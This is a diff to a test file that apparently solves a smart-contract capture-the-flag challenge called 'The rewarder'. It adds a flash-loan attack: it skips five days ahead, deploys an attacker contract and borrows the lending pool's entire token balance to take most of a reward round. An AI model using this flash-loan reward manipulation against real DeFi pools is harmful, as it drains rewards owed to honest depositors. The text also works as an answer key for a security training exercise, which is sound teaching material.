@@ -66,6 +66,16 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // You don't have any DVT tokens. BUT in the upcoming round, claim most rewards for yourself! 
+        // Hint: flash loan
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        // 1. make a flash loan of max amount via a attracker contract
+        // 2. make a receiveFlashLoan function in the attacker contract that will deposit the max amount
+        const AttackerFactory = await ethers.getContractFactory('RewardAttacker', deployer);
+        
+        this.attacker = await AttackerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
+        const attackAmount = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
+        this.attacker.connect(attacker).attack(attackAmount);
     });
 
     after(async function () {
